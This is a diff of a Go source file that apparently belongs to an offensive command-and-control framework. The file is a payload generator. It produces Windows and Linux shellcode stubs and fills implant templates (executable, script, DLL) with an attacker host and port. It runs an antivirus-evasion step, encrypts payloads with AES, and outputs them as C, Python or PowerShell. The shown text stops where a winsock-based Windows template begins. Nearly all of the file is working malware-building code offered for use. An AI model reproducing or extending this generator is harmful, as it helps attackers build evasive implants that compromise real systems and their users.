@@ -1,4 +1,5 @@
 package system
+
 import (
 	"bytes"
 	"crypto/aes"
@@ -14,47 +15,50 @@ import (
 	"path/filepath"
 	"runtime"
 	"text/template"
-	"github.com/simplified_c2/core/security"
+
+	"github.com/0xvyper/mihra/core/security"
 )
+
 type PayloadType int
 type Protocol int
+
 const (
-	
 	TCP Protocol = iota
-	
+
 	UDP
-	
+
 	HTTP
-	
+
 	HTTPS
-	
+
 	DNS
 )
 const (
-	
 	ShellcodePayload PayloadType = iota
-	
+
 	ExecutablePayload
-	
+
 	ScriptPayload
-	
+
 	DLLPayload
 )
+
 type PayloadFormat int
+
 const (
-	
 	RawFormat PayloadFormat = iota
-	
+
 	HexFormat
-	
+
 	Base64Format
-	
+
 	CFormat
-	
+
 	PythonFormat
-	
+
 	PowerShellFormat
 )
+
 type PayloadConfig struct {
 	Type           PayloadType
 	Format         PayloadFormat
@@ -68,6 +72,7 @@ type PayloadConfig struct {
 	Obfuscate      bool
 	SecurityConfig *security.SecurityManager
 }
+
 func DefaultPayloadConfig() *PayloadConfig {
 	return &PayloadConfig{
 		Type:         ShellcodePayload,
@@ -82,17 +87,19 @@ func DefaultPayloadConfig() *PayloadConfig {
 		Obfuscate:    true,
 	}
 }
+
 type PayloadGenerator struct {
 	Config     *PayloadConfig
 	secManager *security.SecurityManager
 	templates  map[string]*template.Template
 }
+
 func NewPayloadGenerator(config *PayloadConfig) *PayloadGenerator {
-	
+
 	if config == nil {
 		config = DefaultPayloadConfig()
 	}
-	
+
 	var secManager *security.SecurityManager
 	if config.SecurityConfig != nil {
 		secManager = config.SecurityConfig
@@ -108,7 +115,7 @@ func NewPayloadGenerator(config *PayloadConfig) *PayloadGenerator {
 func (p *PayloadGenerator) GeneratePayload() ([]byte, error) {
 	var payload []byte
 	var err error
-	
+
 	switch p.Config.Type {
 	case ShellcodePayload:
 		payload, err = p.generateShellcodePayload()
@@ -124,56 +131,52 @@ func (p *PayloadGenerator) GeneratePayload() ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	
+
 	if p.Config.Obfuscate && p.secManager != nil {
 		payload, err = security.NewAntiVirusEvasion().DeobfuscateSignature(payload, byte(123))
 		if err != nil {
 			return nil, fmt.Errorf("failed to obfuscate payload: %v", err)
 		}
 	}
-	
+
 	return p.formatPayload(payload)
 }
 func (p *PayloadGenerator) generateShellcodePayload() ([]byte, error) {
-	
-	
-	
+
 	if p.Config.Platform == "windows" {
 		if p.Config.Architecture == "x64" {
-			
+
 			return []byte{0x48, 0x31, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x3D}, nil
 		} else {
-			
+
 			return []byte{0x31, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xB0, 0x01}, nil
 		}
 	} else {
 		if p.Config.Architecture == "x64" {
-			
+
 			return []byte{0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x0F, 0x05}, nil
 		} else {
-			
+
 			return []byte{0x31, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0xB0, 0x66, 0xB3, 0x01}, nil
 		}
 	}
 }
 func (p *PayloadGenerator) generateExecutablePayload() ([]byte, error) {
-	
-	
-	
+
 	var templateName string
 	if p.Config.Platform == "windows" {
 		templateName = "windows_executable"
 	} else {
 		templateName = "linux_executable"
 	}
-	
+
 	tmpl, err := p.getTemplate(templateName)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	var buf bytes.Buffer
-	
+
 	err = tmpl.Execute(&buf, map[string]interface{}{
 		"Host":     p.Config.Host,
 		"Port":     p.Config.Port,
@@ -186,23 +189,21 @@ func (p *PayloadGenerator) generateExecutablePayload() ([]byte, error) {
 	return buf.Bytes(), nil
 }
 func (p *PayloadGenerator) generateScriptPayload() ([]byte, error) {
-	
-	
-	
+
 	var templateName string
 	if p.Config.Platform == "windows" {
 		templateName = "windows_script"
 	} else {
 		templateName = "linux_script"
 	}
-	
+
 	tmpl, err := p.getTemplate(templateName)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	var buf bytes.Buffer
-	
+
 	err = tmpl.Execute(&buf, map[string]interface{}{
 		"Host":     p.Config.Host,
 		"Port":     p.Config.Port,
@@ -215,23 +216,21 @@ func (p *PayloadGenerator) generateScriptPayload() ([]byte, error) {
 	return buf.Bytes(), nil
 }
 func (p *PayloadGenerator) generateDLLPayload() ([]byte, error) {
-	
-	
-	
+
 	var templateName string
 	if p.Config.Platform == "windows" {
 		templateName = "windows_dll"
 	} else {
 		templateName = "linux_shared_library"
 	}
-	
+
 	tmpl, err := p.getTemplate(templateName)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	var buf bytes.Buffer
-	
+
 	err = tmpl.Execute(&buf, map[string]interface{}{
 		"Host":     p.Config.Host,
 		"Port":     p.Config.Port,
@@ -300,11 +299,11 @@ func (p *PayloadGenerator) formatPowerShellBytes(payload []byte) []byte {
 	return buf.Bytes()
 }
 func (p *PayloadGenerator) getTemplate(name string) (*template.Template, error) {
-	
+
 	if tmpl, ok := p.templates[name]; ok {
 		return tmpl, nil
 	}
-	
+
 	var templateContent string
 	switch name {
 	case "windows_executable":
@@ -322,93 +321,92 @@ func (p *PayloadGenerator) getTemplate(name string) (*template.Template, error) 
 	default:
 		return nil, fmt.Errorf("template not found: %s", name)
 	}
-	
+
 	tmpl, err := template.New(name).Parse(templateContent)
 	if err != nil {
 		return nil, fmt.Errorf("failed to parse template: %v", err)
 	}
-	
+
 	p.templates[name] = tmpl
 	return tmpl, nil
 }
 func (p *PayloadGenerator) SavePayload(payload []byte, filePath string) error {
-	
+
 	dir := filepath.Dir(filePath)
 	if dir != "" && dir != "." {
 		if err := os.MkdirAll(dir, 0755); err != nil {
 			return fmt.Errorf("failed to create directory: %v", err)
 		}
 	}
-	
+
 	if err := os.WriteFile(filePath, payload, 0644); err != nil {
 		return fmt.Errorf("failed to write payload to file: %v", err)
 	}
 	return nil
 }
 func (p *PayloadGenerator) EncryptPayload(payload []byte, password string) ([]byte, error) {
-	
+
 	key := deriveKey(password)
-	
+
 	return encryptAES(payload, key)
 }
 func (p *PayloadGenerator) DecryptPayload(encryptedPayload []byte, password string) ([]byte, error) {
-	
+
 	key := deriveKey(password)
-	
+
 	return decryptAES(encryptedPayload, key)
 }
 func deriveKey(password string) []byte {
-	
-	
-	
+
 	hash := sha256.Sum256([]byte(password))
 	return hash[:]
 }
 func encryptAES(plaintext, key []byte) ([]byte, error) {
-	
+
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
 		return nil, err
 	}
-	
+
 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
 	return ciphertext, nil
 }
 func decryptAES(ciphertext, key []byte) ([]byte, error) {
-	
+
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	nonceSize := gcm.NonceSize()
 	if len(ciphertext) < nonceSize {
 		return nil, errors.New("ciphertext too short")
 	}
-	
+
 	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
-	
+
 	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
 	if err != nil {
 		return nil, err
 	}
 	return plaintext, nil
 }
+
 const windowsExecutableTemplate = `
 #include <winsock2.h>
 #include <windows.h>
